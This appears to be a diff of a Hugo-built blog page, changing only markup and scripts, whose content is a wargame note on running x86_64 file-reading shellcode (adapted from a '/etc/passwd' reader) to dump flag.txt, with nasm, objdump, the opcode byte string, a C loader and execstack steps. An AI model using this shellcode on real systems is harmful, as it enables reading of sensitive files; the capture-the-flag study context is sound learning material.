@@ -26,7 +26,7 @@ BITS 64 ; Author Mr.Un1k0d3r - RingZer0 Team ; Read /etc/passwd Linux x86_64 She
 
 
 
-<meta name="generator" content="Hugo 0.75.1" />
+<meta name="generator" content="Hugo 0.89.4" />
 
 <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet">
 <style type="text/css">/*https://coolors.co/afd5aa-f0f2ef-a69f98-3d3d3d-8c6057*/
@@ -42,6 +42,10 @@ BITS 64 ; Author Mr.Un1k0d3r - RingZer0 Team ; Read /etc/passwd Linux x86_64 She
 <link href='https://blog.dornea.nu/css/styles.css' rel="stylesheet">
 <link rel="stylesheet" href="https://blog.dornea.nu/css/custom.css">
 
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox/dist/css/glightbox.min.css" />
+<script src="https://cdn.jsdelivr.net/gh/mcstudios/glightbox/dist/js/glightbox.min.js"></script>
 
 
 <link rel="icon" 
@@ -86,7 +90,7 @@ type="image/x-icon"/>
     
   </p>
   <div class="lh-copy post-content"><p>While playing some <a href="http://blog.dornea.nu/tag/wargames/">wargames</a> where I had to read a file called <strong>flag.txt</strong> using C code, one possible solution (unfortunately not the right one) was to use shellcodes to read the file and dump its content. Here are my notes for future use.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.asm" data-lang=".asm"><span style="color:#6ab825;font-weight:bold">BITS</span> <span style="color:#3677a9">64</span>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.asm" data-lang=".asm"><span style="color:#6ab825;font-weight:bold">BITS</span> <span style="color:#3677a9">64</span>
 <span style="color:#999;font-style:italic">; Author Mr.Un1k0d3r - RingZer0 Team</span>
 <span style="color:#999;font-style:italic">; Read /etc/passwd Linux x86_64 Shellcode</span>
 <span style="color:#999;font-style:italic">; Shellcode size 82 bytes</span>
@@ -135,10 +139,10 @@ _push_filename:
     path: <span style="color:#6ab825;font-weight:bold">db</span> <span style="color:#ed9d13">&#34;flag.txt&#34;</span>
 </code></pre></div><h2 id="shellcode-compilation">Shellcode compilation</h2>
 <p>Compile using <strong>nasm</strong>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ nasm -f elf64 shellcode.asm -o shellcode.o
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ nasm -f elf64 shellcode.asm -o shellcode.o
 </code></pre></div><h2 id="disassemble">Disassemble</h2>
 <p>Now you can disassemble the object file using <strong>objdump</strong>:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">shellcode.o:     file format elf64-x86-64
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">shellcode.o:     file format elf64-x86-64
 
 
 Disassembly of section .text:
@@ -181,10 +185,10 @@ Disassembly of section .text:
 
 </code></pre></div><h2 id="assembler-to-c">Assembler to C</h2>
 <p>Now convert the opcodes to some C array:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ for i in $(objdump -d shellcode.o |grep &#34;^ &#34; |cut -f2); do echo -n &#39;\\x&#39;$i; done;echo
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ for i in $(objdump -d shellcode.o |grep &#34;^ &#34; |cut -f2); do echo -n &#39;\\x&#39;$i; done;echo
 \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x66\x6c\x61\x67\x2e\x74\x78\x74
 </code></pre></div><p>Now use this code:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;string.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#cd2828;font-weight:bold">
 </span><span style="color:#cd2828;font-weight:bold">#include</span> <span style="color:#cd2828;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#cd2828;font-weight:bold">
@@ -203,22 +207,22 @@ Disassembly of section .text:
 
 </code></pre></div><h2 id="c-code-compilation">C code compilation</h2>
 <p>&hellip; and compile it.</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ gcc -O3 -Wall -fstack-protector-all -fPIE bin.c -o bin
 bin.c: In function &#39;main&#39;:
 bin.c:20:1: warning: control reaches end of non-void function [-Wreturn-type]
  }
 </code></pre></div><h2 id="make-stack-executable">Make stack executable</h2>
 <p>The binary will segfault if executed. That&rsquo;s because the stack isn&rsquo;t executable:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ readelf -l bin | grep -C 2 GNU_STACK
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ readelf -l bin | grep -C 2 GNU_STACK
 
   GNU_EH_FRAME   0x00000000000005e4 0x00000000004005e4 0x00000000004005e4
                  0x0000000000000034 0x0000000000000034  R      4
   GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                  0x0000000000000000 0x0000000000000000  RW     10
 </code></pre></div><p>Let&rsquo;s make the stack executable:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ /usr/sbin/execstack -s bin
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ /usr/sbin/execstack -s bin
 </code></pre></div><p>And finally run the executable:</p>
-<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat flag.txt
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat flag.txt
 bla
 $ ./bin
 bla
@@ -344,6 +348,13 @@ if (document.getElementById("contents-list") !== null && document.getElementsByC
 
 
 
+
+
+<script>
+ var glightbox = GLightbox({
+     selector: '.glightbox'
+ });
+</script>
 
   
 </body>
